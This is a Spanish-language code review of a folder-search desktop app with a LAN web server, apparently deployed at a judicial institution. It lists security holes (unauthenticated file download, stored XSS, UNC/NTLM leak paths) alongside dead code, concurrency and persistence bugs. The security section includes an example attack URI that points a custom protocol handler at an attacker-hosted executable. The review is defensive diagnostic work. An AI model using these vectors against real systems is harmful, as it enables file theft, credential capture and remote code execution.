# Revisión técnica — BusquedaCarpetas V7 "Purgatorio"

Revisión de código completa (lectura íntegra de los ~13.500 líneas en `src/`, `main.py`, `web_server/`), hecha en 5 pasadas paralelas por subsistema. Sin cambios aplicados — esto es solo diagnóstico, para juntarlo con tu propio listado.

Notación: `archivo:línea` referencia el código real. Severidad: 🔴 Crítico · 🟠 Alto · 🟡 Medio · ⚪ Bajo.

---

## 0. Arquitectura general (contexto)

- Desktop (Tkinter) + servidor web LAN (Flask) comparten el mismo `content_index.db` (SQLite FTS5) y `carpetas_cache.pkl`.
- `main.py` tiene dos modos: normal (Tkinter) y `--server` (Flask standalone, se lanza como subproceso).
- Capa de "managers": ~25 clases orquestadas desde `src/managers/app.py` (`BusquedaCarpetaApp`), patrón que ha crecido mucho (13 managers solo para árbol/archivos).
- Historial de bugs documentado en CHANGELOG/walkthrough (bloqueos de archivo, "Ghost search", colisión de prefijos de ruta) — varios de esos patrones **siguen reapareciendo** en el código actual, ver abajo.

---

## 1. 🔴 SEGURIDAD — el bloque más importante

El servidor web (`web_server/server.py`) escucha en `0.0.0.0:8080`, con CORS abierto a cualquier origen (`CORS(app)`) y **sin ninguna autenticación**. Se arranca automáticamente al abrir la app de escritorio (`app.py:431`, vía `master.after(1000, ...)`), sin un aviso/consentimiento explícito al usuario. Dado que es una institución judicial, esto merece atención antes que cualquier refactor cosmético.

| # | Severidad | Hallazgo | Ubicación |
|---|---|---|---|
| S1 | 🔴 | **Lectura arbitraria de archivos.** `/api/download?path=...` solo valida `os.path.isfile(path)`, sin restringir a las ubicaciones indexadas configuradas. Cualquier equipo en la LAN puede descargar cualquier archivo legible por el proceso (config, documentos de otros usuarios, etc.) sin login. | `web_server/server.py:146-158` |
| S2 | 🔴 | **XSS almacenado en los resultados de búsqueda.** El `snippet` del resultado se inserta con `innerHTML` sin escapar (`escHtml()` sí se aplica a `name`/`path`, pero no al snippet). El snippet es texto extraído de PDFs/Word/TXT indexados — un documento con HTML/JS embebido (ej. un PDF escaneado con OCR, o un `.txt` "sembrado") se ejecuta como script en el navegador de cualquier usuario que busque ese término. | `web_server/static/index.html:399,470` (fuente: `content_indexer.py:44-66,155`) |
| S3 | 🟠 | **`/api/open-folder` como oráculo + vector SSRF-tipo-UNC.** Solo valida `os.path.exists(path)`. Con una ruta UNC (`\\host\share`) fuerza al servidor a hacer una conexión SMB saliente (vector clásico de robo/relay de hash NTLM), y la diferencia 200/404 permite enumerar qué rutas existen en el servidor — todo sin autenticación. | `web_server/server.py:124-142` |
| S4 | 🟠 | **`handler.vbs` ejecuta `Shell.Open` sobre rutas sin validar esquema/UNC.** El instalador registra el protocolo `busqueda://` en `HKCU\Software\Classes\busqueda` (por usuario). Una vez instalado, cualquier sitio web que ese usuario visite después puede intentar `busqueda://open?path=\\atacante\share\evil.exe` (confirmado por lectura de código; el comportamiento exacto del diálogo de confirmación del navegador no se verificó en runtime). | `web_server/client/handler.vbs:100-113` |
| S5 | 🟡 | **Todo el tráfico va por HTTP plano** (instalador, `handler.vbs`, contenido de documentos judiciales en tránsito) — un MITM en la LAN puede sustituir el instalador o leer contenido. | `server.py:188-261` |
| — | ✅ | Verificado que **no** hay inyección SQL/FTS5: la query del usuario siempre va como parámetro `?` ligado, nunca concatenada. `/client/<path:filename>` usa `send_from_directory`, que ya bloquea `../`. No hay credenciales hardcodeadas en `index.html`/`server.py`. | `content_indexer.py:126-184` |

**Recomendación conjunta:** antes de nada, restringir `/api/download` y `/api/open-folder` a las rutas indexadas configuradas (allow-list de raíces), escapar el snippet en `index.html` antes de insertarlo, y añadir algún control de acceso mínimo (token compartido) ya que hoy cualquiera en la red — o cualquier pestaña de navegador de un usuario conectado a esa LAN, gracias al CORS abierto — puede llamar a estos endpoints.

**Nota aparte — `CargarAnotaciones_v4.xlsm` (macro VBA, mismo repo pero herramienta separada):** construye SQL por concatenación de strings (`"...WHERE A112LLAVPROC = '" & llavProc & "'..."`, se repite 8 veces) contra un DSN con `Trusted_Connection=yes` (sin credenciales hardcodeadas, sin `Shell()` ni llamadas HTTP salientes). Riesgo bajo — es una herramienta interna sobre una conexión de confianza — pero técnicamente inyectable si algún día ese campo deja de ser numérico controlado.

---

## 2. 🟠 Código muerto y lógica duplicada (afecta mantenibilidad directamente)

Este es el segundo bloque más grande: hay **features enteras que parecen vivas pero no se ejecutan nunca**, lo que es peligroso porque alguien puede "arreglar un bug" editando la copia muerta.

| # | Hallazgo | Ubicación |
|---|---|---|
| D1 | `verificar_problemas_cache` está **definida dos veces** en la misma clase; Python solo conserva la segunda — la primera implementación (39 líneas) es inalcanzable. | `search_coordinator.py:558` y `:665` |
| D2 | **`SearchManager` completa (151 líneas) es código muerto.** Se instancia en `app.py:389` pero ningún método público se llama jamás; toda búsqueda real pasa por `SearchCoordinator`. | `search_manager.py` |
| D3 | **`tree_explorer.py` (431 líneas) es código muerto.** Se instancia pero su único punto de entrada (`setup_explorer_mode()`) nunca se invoca; la expansión real del árbol la hace `tree_expansion_handler.py` (166 líneas), un sistema paralelo. | `tree_explorer.py` |
| D4 | **`historial_storage.py` es código muerto** — `historial_manager.py` reimplementa la misma persistencia a mano, con un límite distinto (1000 vs 100 registros) y mismo bug de escritura no-atómica (ver §4). Dos fuentes de verdad para lo mismo. | `historial_storage.py` |
| D5 | `changelog_viewer.py`, `manual_viewer.py` y `src/components/__init__.py` tienen **imports rotos** (`from .constants import ...` a un archivo que no existe) — no fallan hoy porque nada los importa, pero son una trampa para quien los reactive. | `ui/changelog_viewer.py:4`, `ui/manual_viewer.py:3`, `src/components/__init__.py:6` |
| D6 | `EventManager.on_tree_select` es una implementación paralela y desincronizada (sin debounce) que nunca se usa — el binding real siempre apunta a `app.on_tree_select`. | `event_manager.py:171-192` |
| D7 | `results_display.py` vs `results_renderer.py`: **no es solo parecido de nombres** — son dos pipelines de inserción distintos sobre el mismo `app.tree` (uno sin dedup de IDs, el otro deduplica por ruta absoluta). Cuál se use depende de qué camino tomó la búsqueda → filas duplicadas inconsistentes según el flujo. | `ui/results_display.py:136`, `ui/results_renderer.py:118-129` |
| D8 | Dos UIs de "gestionar ubicaciones" viven en paralelo y no están integradas entre sí (`LocationsConfigModal` vía Ctrl+U, y la pestaña de configuración dentro de `ContentSearchModal`), y el manual (código muerto, ver D5) documenta un comportamiento de Ctrl+U que ya no es el real. | `locations_config_modal.py`, `content_search_modal.py` |
| D9 | `_on_search_completed_async` referencia una variable `resultados` que no existe (solo `resultados_o_conteo`) — lanzaría `NameError` si algún día se llegara a invocar esa rama muerta. | `search_coordinator.py:515-524` |
| D10 | Código de resize de ventana principal muerto por un comentario mal cortado (`# Limitar ancho...máxim        new_width = ...` quedó todo dentro del comentario) y además nunca está enlazado a ningún evento. | `app.py:678-696,692` |

---

## 3. 🔴🟠 Concurrencia y estabilidad

| # | Severidad | Hallazgo | Ubicación |
|---|---|---|---|
| C1 | 🔴 | **Escritura no atómica de `carpetas_cache.pkl`** + auto-borrado si la lectura falla: si el servidor web lee mientras el desktop escribe, `pickle.load` falla y el código **borra el archivo que el otro proceso acaba de escribir**. Es la misma clase de bug de "bloqueo de índice" que el walkthrough dice haber resuelto, pero aquí sigue sin arreglar (falta temp-file + `os.replace`). | `cache_manager.py:44-106` |
| C2 | 🔴 | **`stop_server()` mata TODOS los procesos `pythonw.exe` del sistema** (`taskkill /F /IM pythonw.exe /T`), no solo el subproceso propio. En modo desarrollo (sin congelar a .exe) esto puede matar la propia app de escritorio u otra herramienta Python del equipo judicial. | `web_server_manager.py:104-106` |
| C3 | 🟠 | **Congela la UI 2.5s** cada vez que arranca el servidor web (`time.sleep(2.5)` en el hilo principal de Tk), y esto ocurre automáticamente en cada inicio de la app, no solo cuando el usuario lo pide. | `web_server_manager.py:70`, disparado desde `app.py:431` |
| C4 | 🟠 | **El guard anti "Ghost Updates" (`current_search_id`) tiene un hueco**: se valida en el hilo worker antes de encolar el callback con `.after(0, ...)`, pero no se revalida *dentro* del callback ya en el main loop. Si arranca una búsqueda nueva mientras el callback viejo sigue en cola, igual se renderizan resultados obsoletos. | `search_coordinator.py:96-99,122-125,143-145,163-165,179-181` |
| C5 | 🟡 | El lock de SQLite es solo un `threading.Lock` (protege dentro de un proceso, no entre el proceso desktop y el proceso `--server`), sin `timeout=` explícito en `sqlite3.connect`; la contención entre procesos se traduce en "sin resultados" silencioso en vez de reintento/error claro. | `content_indexer.py:24` |

---

## 4. 🟡 Robustez de persistencia (JSON/pickle)

Ningún archivo de configuración/estado se escribe de forma atómica en todo el proyecto: `config.py`, `content_locations_manager.py`, `historial_storage.py`, `locations_config_modal.py`, `historial_manager.py` — todos hacen `open(path,'w')` + `dump()` directo. Si el proceso se cierra/mata a mitad de escritura, el archivo queda truncado; el loader captura la excepción pero solo resetea el valor **en memoria**, y el siguiente guardado sobreescribe el archivo corrupto con datos vacíos — pérdida silenciosa de historial/ubicaciones configuradas. Solución estándar: escribir a un `.tmp` y hacer `os.replace()`.

Relacionado: bugs de coincidencia de rutas por prefijo sin separador — el walkthrough documenta haber arreglado el caso "`C:\Documentos`" vs "`C:\Documentos_Viejos`", pero **sigue habiendo dos `str.startswith()` sin `os.sep` en `file_explorer_manager.py:508,1251`**, inconsistente con el check de drag-and-drop en la línea 1151 del mismo archivo, que sí lo hace bien. También hay `LIKE`/prefijo sin escapar `%`/`_` literales en `content_indexer.py:226-227,272,441-442` (una carpeta llamada `50%` podría hacer que un purge/index afecte filas que no debería).

---

## 5. Refactorización recomendada: `file_explorer_manager.py` (1.314 líneas, el archivo más grande del proyecto)

Mezcla 8+ responsabilidades en una sola clase. Propuesta de split:

1. `ExplorerLifecycle` — show/hide/create/resize (~150 líneas)
2. `ExplorerTreeLoader` — carga async de directorios, expansión, refresh (~250 líneas)
3. `ExplorerInlineEditor` — crear carpeta / renombrar inline (~200 líneas)
4. `ExplorerContextMenu` — menú contextual (~120 líneas)
5. `ExplorerClipboard` — copiar/cortar/pegar (~110 líneas)
6. `ExplorerDragDrop` — drag & drop (~150 líneas)
7. `ExplorerPathSync` — sincronización de foco de ruta (~90 líneas)
8. `FileExplorerManager` — fachada delgada que compone lo anterior, compartiendo los mapas `path_to_item`/`item_to_path`

Segundo candidato a split: `content_search_modal.py` (956 líneas — shell de ventana + 2 vistas de búsqueda + pestaña de config/indexado + orquestación de hilo de indexado + menús + un Toplevel completo de Quick Look + **su propio sistema de theming recursivo** duplicado en vez de reusar `theme_manager`).

Otros: `app.py` (758 líneas) es un god-object que conecta ~25 managers y además contiene lógica de negocio propia (heurísticas de resolución de rutas); cada manager recibe el `app` completo y hurga en `app.xxx` en vez de recibir solo lo que necesita — dificulta testear cualquier pieza de forma aislada.

---

## 6. UI / tema oscuro

- La paleta `TEMAS["oscuro"]` en `theme_manager.py` **no tiene las mismas claves** que la clara (`button_active_fg`, `accent_primary`, `success`, `warning`, `error`, `button_hover`, `bg_surface`, `fg_disabled` faltan). El código las accede sin `.get()` (`theme_manager.py:309,330,341`), lanza `KeyError`, y queda silenciado por un `except: pass` — los botones de cerrar/limpiar/exportar del panel de historial simplemente no se retematizan en modo oscuro.
- `about_dialog.py` y `locations_config_modal.py` nunca consultan `theme_manager` — colores claros hardcodeados, quedan en modo claro aunque el resto de la app esté en oscuro. Confirma que el dark mode se fue parchando ventana por ventana en vez de con una abstracción central.
- `Colors`/`Fonts` están duplicadas entre `ui_components.py` y `core/constants.py` (este último dice en un comentario que `Colors` "fue eliminada para evitar duplicación" — pero la copia sigue viva en el otro archivo).

---

## 7. Rendimiento (menor prioridad, nada urgente)

- `buscar_en_cache` es un escaneo O(n) sin índice sobre hasta ~1M entradas — hoy es rápido, pero si el volumen de carpetas cachadas crece, podría notarse por tecla presionada.
- `_show_preview` (Quick Look, barra espaciadora) extrae texto de PDF/DOCX **sincrónicamente en el hilo de Tk** — a diferencia de la búsqueda normal, que sí es asíncrona. Un PDF grande o escaneado congela la app mientras se abre la vista previa.
- `search_engine.py:77` usa `root.replace(self.ruta_base, '')`, que reemplaza *todas* las ocurrencias del substring, no solo el prefijo — puede calcular mal la profundidad si el texto de la ruta base se repite más abajo en el árbol.

---

## Resumen priorizado (si solo vas a atacar 5 cosas primero)

1. **Restringir `/api/download` y `/api/open-folder` a rutas indexadas conocidas** + escapar el `snippet` en `index.html` (S1, S2, S3) — es lo único con impacto de seguridad real hoy.
2. **Hacer atómica la escritura de `carpetas_cache.pkl`** y quitar el auto-borrado en fallo de lectura (C1) — causa pérdida de caché en uso normal con servidor+desktop activos a la vez.
3. **Acotar `taskkill /F /IM pythonw.exe /T`** a solo el PID hijo (C2) — puede matar la app de escritorio en desarrollo.
4. **Purgar el código muerto** (D1-D10) antes de seguir agregando features — reduce la superficie de confusión y el riesgo de "arreglar" una copia que no se ejecuta.
5. **Dividir `file_explorer_manager.py`** — es el archivo que más va a doler en cualquier cambio futuro mientras siga como está.
